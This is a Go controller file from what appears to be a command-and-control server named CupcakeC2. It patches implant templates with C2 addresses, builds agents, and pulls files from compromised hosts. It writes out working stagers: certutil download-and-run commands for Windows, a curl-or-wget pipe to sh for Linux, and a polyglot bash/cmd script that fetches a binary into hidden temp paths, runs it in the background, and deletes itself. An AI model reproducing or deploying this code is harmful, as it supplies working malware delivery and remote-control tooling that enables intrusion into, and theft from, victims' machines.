package controllers

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/hub"
	"cupcake-server/pkg/utils"
	"cupcake-server/services"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"sync"
)

var StagerCache = sync.Map{}

type StagerConfig struct {
	OS              string
	Arch            string
	ListenerID      string
	Host            string
	AutoDestruct    bool
	SleepTime       int
	Extra           string // For bat stager: "url64|url32"
}

var upgrader_gen = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func HandleGenerate(c *gin.Context) {
	var req struct {
		OS              string `json:"os"`
		Arch            string `json:"arch"`
		ListenerID      string `json:"listener_id"`
		Host            string `json:"host"`
		Method          string `json:"method"`
		AutoDestruct    bool   `json:"auto_destruct"`
		SleepTime       int    `json:"sleep_time"`
		AesKey          string `json:"aes_key"`
		UseUPX          bool   `json:"use_upx"`
		EncryptionSalt  string `json:"encryption_salt"`
		ObfuscationMode string `json:"obfuscation_mode"`
		Jitter          int    `json:"jitter"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}

	// 1. Fetch Listener Details
	val, ok := globals.Listeners.Load(req.ListenerID)
	if !ok {
		c.JSON(404, gin.H{"error": "监听器未在线或不存在"})
		return
	}
	ln := val.(*globals.Listener)

	req.EncryptionSalt = ln.EncryptionSalt
	req.ObfuscationMode = ln.ObfuscateMode
	req.AesKey = ln.EncryptKey
	if req.Jitter == 0 {
		req.Jitter = ln.HeartbeatJitter
	}
	if req.Jitter == 0 {
		req.Jitter = 30 // Default 30%
	}

	// --- [NEW] Method Dispatcher ---
	
	// Mode A: Binary Patch (Synchronous, fast)
	if req.Method == "patch" {
		// Prepare template name based on protocol and OS
		templateName := "client_template_linux"
		if req.OS == "windows" {
			switch strings.ToUpper(ln.Protocol) {
			case "WS":
				templateName = "client_template_windows.exe"
			case "TCP":
				templateName = "client_template_windows_tcp.exe"
			case "BIND-TCP", "正向TCP":
				templateName = "client_template_windows_bind.exe"
			case "DNS":
				templateName = "client_template_windows_dns.exe"
			default:
				templateName = "client_template_windows.exe"
			}
		} else if req.OS == "linux" {
			switch strings.ToUpper(ln.Protocol) {
			case "WS":
				templateName = "client_template_linux"
			case "TCP":
				templateName = "client_template_linux_tcp"
			case "BIND-TCP", "正向TCP":
				templateName = "client_template_linux_bind"
			case "DNS":
				templateName = "client_template_linux_dns"
			default:
				templateName = "client_template_linux"
			}
			if req.Arch == "arm64" {
				templateName += "_arm64"
			}
		}
		templatePath := filepath.Join("assets", templateName)
		raw, err := os.ReadFile(templatePath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "未找到预编译模板 (" + templateName + ")，请确保已编译模板或切换到源码模式"})
			return
		}

		// Prepare C2 URL with correct scheme
		c2url := ""
		host := req.Host
		if host == "" {
			host = "127.0.0.1"
		}

		switch strings.ToUpper(ln.Protocol) {
		case "WS":
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		case "TCP":
			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
		case "BIND-TCP", "正向TCP":
			// Bind 模式下，Agent 将在受害机监听指定端口
			c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
		case "DNS":
			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
		default:
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		}

		patched, err := services.PatchPayload(raw, c2url, req.AesKey, ln.HeartbeatInterval, req.Jitter, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "补丁失败: " + err.Error()})
			return
		}

		randSuffix, _ := utils.RandomAlphaString(8)
		filename := randSuffix
		if req.OS == "windows" {
			filename += ".exe"
		}

		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
		c.Data(http.StatusOK, "application/octet-stream", patched)
		return
	}

	// Mode B: Source Build (Asynchronous, supports cross-compilation/custom features)
	taskID := uuid.New().String()

	host := req.Host
	if host == "" {
		host = "127.0.0.1"
	}
	if strings.ToUpper(ln.Protocol) == "DNS" {
		host = ln.NSDomain
	}

	conf := services.PayloadConfig{
		OSType:            req.OS,
		Arch:              req.Arch,
		Protocol:          ln.Protocol,
		Host:              host,
		Port:              fmt.Sprintf("%d", ln.Port),
		AESKey:            req.AesKey,
		AutoDestruct:      req.AutoDestruct,
		SleepTime:         req.SleepTime,
		UseUPX:            req.UseUPX,
		HeartbeatInterval: ln.HeartbeatInterval,
		EncryptionSalt:    req.EncryptionSalt,
		ObfuscationMode:   req.ObfuscationMode,
		Jitter:            req.Jitter,
	}

	go func() {
		logChan := make(chan string, 100)
		hub.BuildHub.Broadcast(taskID, hub.WsPacket{
			MsgType: "log",
			Content: "[*] 构建引擎已就绪，正在初始化任务流...",
			TaskID:  taskID,
		})
		go func() {
			for line := range logChan {
				hub.BuildHub.Broadcast(taskID, hub.WsPacket{
					MsgType: "log",
					Content: line,
					TaskID:  taskID,
				})
			}
		}()

		artifactPath, err := services.BuildAgentWithLogger(conf, logChan)
		if err != nil {
			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
				MsgType: "error",
				Content: err.Error(),
				TaskID:  taskID,
			})
		} else {
			filename := filepath.Base(artifactPath)
			downloadURL := "/api/payloads/" + filename
			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
				MsgType: "success",
				Content: downloadURL,
				TaskID:  taskID,
			})
		}
		close(logChan)
	}()

	c.JSON(http.StatusOK, gin.H{
		"status":  "success",
		"task_id": taskID,
		"msg":     "构建任务已启动",
	})
}

func HandleGenerateStream(c *gin.Context) {
	c.JSON(400, gin.H{"error": "Please use POST /api/generate"})
}

func HandleBuildLogsWS(c *gin.Context) {
	taskID := c.Param("task_id")
	ws, err := upgrader_gen.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	logChan := hub.BuildHub.Subscribe(taskID)
	defer hub.BuildHub.Unsubscribe(taskID, logChan)

	for packet := range logChan {
		if err := ws.WriteJSON(packet); err != nil {
			break
		}
	}
}

func HandleFsDownload(c *gin.Context) {
	uuid := c.Query("uuid")
	path := c.Query("path")

	if uuid == "" || path == "" {
		var req struct {
			UUID string `json:"uuid"`
			Path string `json:"path"`
		}
		if err := c.ShouldBindJSON(&req); err == nil {
			if uuid == "" {
				uuid = req.UUID
			}
			if path == "" {
				path = req.Path
			}
		}
	}

	if uuid == "" || path == "" {
		c.JSON(400, gin.H{"error": "uuid and path are required"})
		return
	}

	filename := filepath.Base(path)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Transfer-Encoding", "chunked")

	offset := uint64(0)
	chunkSize := 2 * 1024 * 1024 // 2MB

	c.Stream(func(w io.Writer) bool {
		dataBase64, isEOF, err := services.DownloadChunk(uuid, path, offset, chunkSize)
		if err != nil {
			return false // Abort stream
		}

		data, err := base64.StdEncoding.DecodeString(dataBase64)
		if err == nil && len(data) > 0 {
			w.Write(data)
			offset += uint64(len(data))
		}

		if isEOF || len(data) == 0 {
			return false // End of file
		}
		return true // Request next chunk
	})
}

func HandleGetStager(c *gin.Context) {
	listenerID := c.Query("listener_id")
	osType := c.Query("os")     // windows, linux
	arch := c.Query("arch")     // x64, arm64
	host := c.Query("host")     // C2 public host
	
	if listenerID == "" || osType == "" {
		c.JSON(400, gin.H{"error": "listener_id and os are required"})
		return
	}

	serverHost := c.Request.Host
	if host != "" { serverHost = host }
	protocol := "http"
	if c.Request.TLS != nil { protocol = "https" }

	if osType == "windows" {
		// Windows: 生成两个 stager ID (x64 + x86)，bat 脚本自动判断架构
		id64 := uuid.New().String()[:3]
		id32 := uuid.New().String()[:3]
		StagerCache.Store(id64, StagerConfig{OS: "windows", Arch: "x64", ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})
		StagerCache.Store(id32, StagerConfig{OS: "windows", Arch: "x86", ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})

		url64 := fmt.Sprintf("%s://%s/api/s/bin/%s", protocol, serverHost, id64)
		url32 := fmt.Sprintf("%s://%s/api/s/bin/%s", protocol, serverHost, id32)

		// bat 脚本：自动检测架构，下载对应版本并执行
		command := fmt.Sprintf("certutil.exe -urlcache -split -f %s C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat", 
			fmt.Sprintf("%s://%s/api/s/w_%s_%s", protocol, serverHost, id64, id32))

		// 注册一个特殊的 bat stager，内容是架构判断脚本
		batID := fmt.Sprintf("w_%s_%s", id64, id32)
		StagerCache.Store(batID, StagerConfig{OS: "windows_bat", Arch: "auto", ListenerID: listenerID, Host: host,
			AutoDestruct: true, SleepTime: 10,
			Extra: fmt.Sprintf("%s|%s", url64, url32),
		})

		c.JSON(200, gin.H{"id": batID, "command": command})
	} else {
		// Linux: 单一 stager
		id := uuid.New().String()[:3]
		StagerCache.Store(id, StagerConfig{OS: "linux", Arch: arch, ListenerID: listenerID, Host: host, AutoDestruct: true, SleepTime: 10})
		baseURL := fmt.Sprintf("%s://%s/api/s/%s", protocol, serverHost, id)
		command := fmt.Sprintf("(curl -fsSL -m180 %s||wget -T180 -q %s)|sh", baseURL, baseURL)
		c.JSON(200, gin.H{"id": id, "command": command})
	}
}

func HandleServePayload(c *gin.Context) {
	id := c.Param("id")
	val, ok := StagerCache.Load(id)
	if !ok {
		c.Data(404, "text/plain", []byte("Not found"))
		return
	}
	conf := val.(StagerConfig)

	// 🚀 Windows BAT stager: returns a script that auto-detects x64/x86
	if conf.OS == "windows_bat" {
		parts := strings.Split(conf.Extra, "|")
		if len(parts) != 2 {
			c.Data(500, "text/plain", []byte("Invalid bat config"))
			return
		}
		url64 := parts[0]
		url32 := parts[1]

		bat := fmt.Sprintf(`@echo off
if "%%PROCESSOR_ARCHITECTURE%%"=="AMD64" (
    certutil.exe -urlcache -split -f %s %%TEMP%%\svc.exe >nul 2>&1
) else (
    certutil.exe -urlcache -split -f %s %%TEMP%%\svc.exe >nul 2>&1
)
start /b %%TEMP%%\svc.exe
del /f /q "%%~f0" >nul 2>&1
`, url64, url32)

		c.Data(200, "application/octet-stream", []byte(bat))
		return
	}

	// Build the binary download URL from the current request
	protocol := "http"
	if c.Request.TLS != nil {
		protocol = "https"
	}
	binaryURL := fmt.Sprintf("%s://%s/api/s/bin/%s", protocol, c.Request.Host, id)

	// Craft a polyglot script: works in both bash/sh and Windows cmd.exe.
	// The first line is a valid trick:
	//   - In bash: '#" starts a comment → entire line ignored
	//   - In cmd.exe: '#!' is not a command → error hidden by '2>nul',
	//     then '@echo off & goto :BAT_START' jumps past the bash section
	script := fmt.Sprintf(`#!/bin/sh 2>nul & @echo off & goto :BAT_START

# [CupcakeC2] Universal Stager — self-detects bash vs cmd.exe
# Binary download URL (embedded at build time):
#   %s

# ---- BASH / POSIX SHELL -------------------------------------------------
if command -v curl >/dev/null 2>&1; then
    curl -fsSL -m300 "%s" -o /tmp/.cupcake 2>/dev/null
elif command -v wget >/dev/null 2>&1; then
    wget -T300 -q "%s" -O /tmp/.cupcake 2>/dev/null
fi
if [ -f /tmp/.cupcake ] && [ -s /tmp/.cupcake ]; then
    chmod +x /tmp/.cupcake 2>/dev/null
    nohup /tmp/.cupcake >/dev/null 2>&1 &
    sleep 1 2>/dev/null
    rm -f /tmp/.cupcake 2>/dev/null
fi
exit 0

# ---- WINDOWS CMD.EXE ----------------------------------------------------
:BAT_START
@echo off
certutil.exe -urlcache -split -f "%s" %%TEMP%%\svc.exe >nul 2>&1
if exist %%TEMP%%\svc.exe (
    start /b %%TEMP%%\svc.exe
    del /f /q "%%~f0" >nul 2>&1
)
exit /b 0
`, binaryURL, binaryURL, binaryURL, binaryURL)

	c.Data(200, "application/octet-stream", []byte(script))
}

// HandleServeRawPayload serves the raw patched binary (no script wrapping).
// Used internally by the polyglot script at /api/s/:id and by the
// Windows BAT stager at /api/s/bin/:id.
func HandleServeRawPayload(c *gin.Context) {
	id := c.Param("id")
	val, ok := StagerCache.Load(id)
	if !ok {
		c.Data(404, "text/plain", []byte("Not found"))
		return
	}
	conf := val.(StagerConfig)

	// Auto-detect target OS from User-Agent if set to "auto"
	targetOS := conf.OS
	if targetOS == "" || targetOS == "auto" {
		ua := strings.ToLower(c.Request.UserAgent())
		if strings.Contains(ua, "windows") || strings.Contains(ua, "win") || strings.Contains(ua, "certutil") {
			targetOS = "windows"
		} else {
			targetOS = "linux"
		}
	}

	// Fetch Listener Details
	lnVal, ok := globals.Listeners.Load(conf.ListenerID)
	if !ok {
		c.Data(404, "text/plain", []byte("Listener not found"))
		return
	}
	ln := lnVal.(*globals.Listener)

	// Prepare template name based on detected OS and protocol
	templateName := ""
	if targetOS == "windows" {
		switch strings.ToUpper(ln.Protocol) {
		case "WS":
			templateName = "client_template_windows.exe"
		case "TCP":
			templateName = "client_template_windows_tcp.exe"
		case "BIND-TCP", "正向TCP":
			templateName = "client_template_windows_bind.exe"
		case "DNS":
			templateName = "client_template_windows_dns.exe"
		default:
			templateName = "client_template_windows.exe"
		}
		// 🐛 Windows x86 特殊处理（仅 WS 协议有 x86 模板）
		if conf.Arch == "x86" || conf.Arch == "i386" {
			x86Name := strings.Replace(templateName, ".exe", "_x86.exe", 1)
			if _, err := os.Stat(filepath.Join("assets", x86Name)); err == nil {
				templateName = x86Name
			}
		}
	} else {
		switch strings.ToUpper(ln.Protocol) {
		case "WS":
			templateName = "client_template_linux"
		case "TCP":
			templateName = "client_template_linux_tcp"
		case "BIND-TCP", "正向TCP":
			templateName = "client_template_linux_bind"
		case "DNS":
			templateName = "client_template_linux_dns"
		default:
			templateName = "client_template_linux"
		}
		if conf.Arch == "arm64" {
			templateName += "_arm64"
		}
	}

	templatePath := filepath.Join("assets", templateName)
	raw, err := os.ReadFile(templatePath)
	if err != nil {
		c.Data(500, "text/plain", []byte("Template not found: "+templateName))
		return
	}

	host := conf.Host
	if host == "" {
		host = strings.Split(c.Request.Host, ":")[0]
	}

	c2url := ""
	switch strings.ToUpper(ln.Protocol) {
	case "WS":
		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
	case "TCP":
		c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
	case "BIND-TCP", "正向TCP":
		c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
	case "DNS":
		c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
	default:
		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
	}

	patched, err := services.PatchPayload(raw, c2url, ln.EncryptKey, ln.HeartbeatInterval, ln.HeartbeatJitter, "", conf.AutoDestruct, conf.SleepTime, ln.EncryptionSalt, ln.ObfuscateMode)
	if err != nil {
		c.Data(500, "text/plain", []byte("Patch failed: "+err.Error()))
		return
	}

	c.Data(200, "application/octet-stream", patched)
}

// HandleServeProtectedPayload: 受保护的 Payload 下载接口（替代 Static("/downloads")）
// 已通过 AuthMiddleware 鉴权，防止目录枚举和路径穿越
func HandleServeProtectedPayload(c *gin.Context) {
	filename := c.Param("filename")

	// 🛡️ 路径穿越检查：只允许纯文件名，不允许任何路径分隔符
	if strings.Contains(filename, "/") || strings.Contains(filename, "\\") ||
		strings.Contains(filename, "..") || filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
		return
	}

	// 限定到指定目录
	fullPath := filepath.Join("storage", "payloads", filename)
	fullPath = filepath.Clean(fullPath)

	// 二次确认路径在允许范围内
	baseDir, _ := filepath.Abs(filepath.Join("storage", "payloads"))
	absPath, _ := filepath.Abs(fullPath)
	if !strings.HasPrefix(absPath, baseDir) {
		c.JSON(http.StatusForbidden, gin.H{"error": "Access denied"})
		return
	}

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	c.FileAttachment(fullPath, filename)
}
